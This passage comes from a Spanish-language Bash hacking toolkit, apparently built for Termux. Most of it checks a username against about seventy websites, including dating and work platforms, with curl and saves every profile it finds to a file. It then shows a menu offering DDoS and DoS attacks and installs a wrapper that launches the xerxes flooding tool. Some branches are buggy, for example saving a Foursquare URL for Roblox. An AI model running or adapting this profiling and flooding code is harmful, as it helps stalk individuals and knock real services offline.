 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Fotolog: \e[0m" 
 check1=$(curl -s -i "https://fotolog.com/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://fotolog.com/%s\n" $username 
 printf "https://fotolog.com/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Spotify: \e[0m" 
 check1=$(curl -s -i "https://open.spotify.com/user/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://open.spotify.com/user/%s\n" $username 
 printf "https://open.spotify.com/user/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] MixCloud: \e[0m" 
 check1=$(curl -s -i "https://www.mixcloud.com/$username" -H "Accept-Language: en" -L | grep -o 'error-message' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.mixcloud.com/%s\n" $username 
 printf "https://www.mixcloud.com/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Scribd: \e[0m" 
 check1=$(curl -s -i "https://www.scribd.com/$username" -H "Accept-Language: en" -L | grep -o 'show_404' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.scribd.com/%s\n" $username 
 printf "https://www.scribd.com/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Badoo: \e[0m" 
 check1=$(curl -s -i "https://www.badoo.com/en/$username" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo Encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.badoo.com/en/%s\n" $username 
 printf "https://www.badoo.com/en/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Patreon: \e[0m" 
 check1=$(curl -s -i "https://www.patreon.com/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.patreon.com/%s\n" $username 
 printf "https://www.patreon.com/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] BitBucket: \e[0m" 
 check1=$(curl -s -i "https://bitbucket.org/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://bitbucket.org/%s\n" $username 
 printf "https://bitbucket.org/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] DailyMotion: \e[0m" 
 check1=$(curl -s -i "https://www.dailymotion.com/$username" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.dailymotion.com/%s\n" $username 
 printf "https://www.dailymotion.com/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Etsy: \e[0m" 
 check1=$(curl -s -i "https://www.etsy.com/shop/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.etsy.com/shop/%s\n" $username 
 printf "https://www.etsy.com/shop/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] CashMe: \e[0m" 
 check1=$(curl -s -i "https://cash.me/$username" -H "Accept-Language: en" -L | grep -o '404 Not Found'; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://cash.me/%s\n" $username 
 printf "https://cash.me/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Behance: \e[0m" 
 check1=$(curl -s -i "https://www.behance.net/$username" -H "Accept-Language: en" -L | grep -o '404 Not Found'; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.behance.net/%s\n" $username 
 printf "https://www.behance.net/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] GoodReads: \e[0m" 
 check1=$(curl -s -i "https://www.goodreads.com/$username" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.goodreads.com/%s\n" $username 
 printf "https://www.goodreads.com/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Instructables: \e[0m" 
 check1=$(curl -s -i "https://www.instructables.com/member/$username" -H "Accept-Language: en" -L | grep -o '404 NOT FOUND' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.instructables.com/member/%s\n" $username 
 printf "https://www.instructables.com/member/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Keybase: \e[0m" 
 check1=$(curl -s -i "https://keybase.io/$username" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://keybase.io/%s\n" $username 
 printf "https://keybase.io/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Kongregate: \e[0m" 
 check1=$(curl -s -i "https://kongregate.com/accounts/$username" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://kongregate.com/accounts/%s\n" $username 
 printf "https://kongregate.com/accounts/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] LiveJournal: \e[0m" 
 check1=$(curl -s -i "https://$username.livejournal.com" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://%s.livejournal.com\n" $username 
 printf "https://%s.livejournal.com\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] AngelList: \e[0m" 
 check1=$(curl -s -i "https://angel.co/$username" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://angel.co/%s\n" $username 
 printf "https://angel.co/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] last.fm: \e[0m" 
 check1=$(curl -s -i "https://last.fm/user/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://last.fm/user/%s\n" $username 
 printf "https://last.fm/user/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Dribbble: \e[0m" 
 check1=$(curl -s -i "https://dribbble.com/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://dribbble.com/%s\n" $username 
 printf "https://dribbble.com/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Codecademy: \e[0m" 
 check1=$(curl -s -i "https://www.codecademy.com/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0 https://www.codecademy.com/%s\n" $username 
 printf "https://www.codecademy.com/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Gravatar: \e[0m" 
 check1=$(curl -s -i "https://en.gravatar.com/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://en.gravatar.com/%s\n" $username 
 printf "https://en.gravatar.com/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Pastebin: \e[0m" 
 check1=$(curl -s -i "https://pastebin.com/u/$username" -H "Accept-Language: en" -L --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' | grep -o 'location: /index' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNot Encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Found!\e[0m https://pastebin.com/u/%s\n" $username 
 printf "https://pastebin.com/u/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Foursquare: \e[0m" 
 check1=$(curl -s -i "https://foursquare.com/$username" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93m Encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://foursquare.com/%s\n" $username 
 printf "https://foursquare.com/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Roblox: \e[0m" 
 check1=$(curl -s -i "https://www.roblox.com/user.aspx?username=$username" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://foursquare.com/%s\n" $username 
 printf "https://foursquare.com/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Gumroad: \e[0m" 
 check1=$(curl -s -i "https://www.gumroad.com/$username" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93m No encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.gumroad.com/%s\n" $username 
 printf "https://www.gumroad.com/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Newgrounds: \e[0m" 
 check1=$(curl -s -i "https://$username.newgrounds.com" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404 ' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93m  No encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://%s.newgrounds.com\n" $username 
 printf "https://%s.newgrounds.com\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Wattpad: \e[0m" 
 check1=$(curl -s -i "https://www.wattpad.com/user/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404 ' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.wattpad.com/user/%s\n" $username 
 printf "https://www.wattpad.com/user/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Canva: \e[0m" 
 check1=$(curl -s -i "https://www.canva.com/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404 ' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.canva.com/%s\n" $username 
 printf "https://www.canva.com/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] CreativeMarket: \e[0m" 
 check1=$(curl -s -i "https://creativemarket.com/$username" -H "Accept-Language: en" -L | grep -o '404eef72' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://creativemarket.com/%s\n" $username 
 printf "https://creativemarket.com/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Trakt: \e[0m" 
 check1=$(curl -s -i "https://www.trakt.tv/users/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404 ' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.trakt.tv/users/%s\n" $username 
 printf "https://www.trakt.tv/users/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] 500px: \e[0m" 
 check1=$(curl -s -i "https://500px.com/$username" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://500px.com/%s\n" $username 
 printf "https://500px.com/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Buzzfeed: \e[0m" 
 check1=$(curl -s -i "https://buzzfeed.com/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://buzzfeed.com/%s\n" $username 
 printf "https://buzzfeed.com/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] TripAdvisor: \e[0m" 
 check1=$(curl -s -i "https://tripadvisor.com/members/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!8\e[0m https://tripadvisor.com/members/%s\n" $username 
 printf "https://tripadvisor.com/members/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] HubPages: \e[0m" 
 check1=$(curl -s -i "https://$username.hubpages.com" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://%s.hubpages.com/\n" $username 
 printf "https://%s.hubpages.com/\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Contently: \e[0m" 
 check1=$(curl -s -i "https://$username.contently.com" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://%s.contently.com\n" $username 
 printf "https://%s.contently.com\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Houzz: \e[0m" 
 check1=$(curl -s -i "https://houzz.com/user/$username" -H "Accept-Language: en" -L | grep -o 'an error has occurred' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://houzz.com/user/%s\n" $username 
 printf "https://houzz.com/user/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] blip.fm: \e[0m" 
 check1=$(curl -s -i "https://blip.fm/$username" -H "Accept-Language: en" -L | grep -o '404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://blip.fm/%s\n" $username 
 printf "https://blip.fm/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Wikipedia: \e[0m" 
 check1=$(curl -s -i "https://www.wikipedia.org/wiki/User:$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.wikipedia.org/wiki/User:%s\n" $username 
 printf "https://www.wikipedia.org/wiki/User:%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] HackerNews: \e[0m" 
 check1=$(curl -s -i "https://news.ycombinator.com/user?id=$username" -H "Accept-Language: en" -L | grep -o 'No such user' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://news.ycombinator.com/user?id=%s\n" $username 
 printf "https://news.ycombinator.com/user?id=%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] CodeMentor: \e[0m" 
 check1=$(curl -s -i "https://www.codementor.io/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404\|404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo Encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.codementor.io/%s\n" $username 
 printf "https://www.codementor.io/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] ReverbNation: \e[0m" 
 check1=$(curl -s -i "https://www.reverbnation.com/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404\|404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93m Encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.reverbnation.com/%s\n" $username 
 printf "https://www.reverbnation.com/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Designspiration: \e[0m" 
 check1=$(curl -s -i "https://www.designspiration.net/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404\|404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.designspiration.net/%s\n" $username 
 printf "https://www.designspiration.net/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Bandcamp: \e[0m" 
 check1=$(curl -s -i "https://www.bandcamp.com/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404\|404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.bandcamp.com/%s\n" $username 
 printf "https://www.bandcamp.com/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] ColourLovers: \e[0m" 
 check1=$(curl -s -i "https://www.colourlovers.com/love/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404\|404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.colourlovers.com/love/%s\n" $username 
 printf "https://www.colourlovers.com/love/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] IFTTT: \e[0m" 
 check1=$(curl -s -i "https://www.ifttt.com/p/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404\|404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93m No encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.ifttt.com/p/%s\n" $username 
 printf "https://www.ifttt.com/p/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Ebay: \e[0m" 
 check1=$(curl -s -i "https://www.ebay.com/usr/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404\|404 Not Found\|eBay Profile - error' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.ebay.com/usr/%s\n" $username 
 printf "https://www.ebay.com/usr/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Slack: \e[0m" 
 check1=$(curl -s -i "https://$username.slack.com" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404\|404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://%s.slack.com\n" $username 
 printf "https://%s.slack.com\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] OkCupid: \e[0m" 
 check1=$(curl -s -i "https://www.okcupid.com/profile/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404\|404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.okcupid.com/profile/%s\n" $username 
 printf "https://www.okcupid.com/profile/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Trip: \e[0m" 
 check1=$(curl -s -i "https://www.trip.skyscanner.com/user/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404\|404 Not Found\|HTTP/2 410' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.trip.skyscanner.com/user/%s\n" $username 
 printf "https://www.trip.skyscanner.com/user/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Ello: \e[0m" 
 check1=$(curl -s -i "https://ello.co/$username" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404\|404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://ello.co/%s\n" $username 
 printf "https://ello.co/%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Tracky: \e[0m" 
 check1=$(curl -s -i "https://tracky.com/user/$username" -H "Accept-Language: en" -L | grep -o 'profile:username' ; echo $?) 
 if [[ $check1 == *'1'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'0'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://tracky.com/~%s\n" $username 
 printf "https://tracky.com/~%s\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Tripit: \e[0m" 
 check1=$(curl -s -i "https://www.tripit.com/people/$username#/profile/basic-info" -H "Accept-Language: en" -L | grep -o 'location: https://www.tripit.com/home' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://www.tripit.com/people/%s#/profile/basic-info\n" $username 
 printf "https://www.tripit.com/people/%s#/profile/basic-info\n" $username >> $username.txt 
 fi 
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Basecamp: \e[0m" 
 check1=$(curl -s -i "https://$username.basecamphq.com/login" -H "Accept-Language: en" -L | grep -o 'HTTP/2 404\|404 Not Found' ; echo $?) 
 if [[ $check1 == *'0'* ]] ; then 
 printf "\e[1;93mNo encontrado!\e[0m\n" 
 elif [[ $check1 == *'1'* ]]; then 
 printf "\e[1;92m Encontrado!\e[0m https://%s.basecamphq.com/login\n" $username 
 printf "https://%s.basecamphq.com/login\n" $username >> $username.txt 
 fi 
 if [[ -e $username.txt ]]; then 
 echo 
 printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Guardado en:\e[0m\e[1;77m %s.txt\n" $username 
 echo 
 fi 
 elif [[ "${opt}" == "4" || "${opt}" == "04" ]]; then 
 banner 
 ChCon 
 echo -e "      ${R}[${G} • • ${R}]${W}${GR} ELIJE EL TIPO DE ATAQUE ${R}[${G} • •${R} ]${W}${W}" 
 echo 
 echo -e "  ${R}[${G}01${R}]${W} DDOS                                            🔥" 
 echo -e "  ${R}[${G}02${R}]${W} DOS                                            🔥" 
 echo 
 echo -ne "  ${R}Dtve_Web${W} >>${G} " 
 read sw 
 if [ -z "${sw}" ]; then 
 echo 
 echo -e "  ${GR}[${R}*${GR}]${R}${R} ERROR: ${W}Debes elejir una opción" 
 echo 
 exit 
 fi 
 if [[ "${sw}" == "01" || "${sw}" == "1" ]]; then 
 banner 
 if [ ! -x $PREFIX/bin/XERXES ]; then 
  
 echo ''' #!/bin/bash 
 XERXES="/data/data/com.termux/files/home/trackerssl/.modules" 
 cd ${XERXES} 
 ./xerxes "$@" 
 ''' > $PREFIX/bin/XERXES 
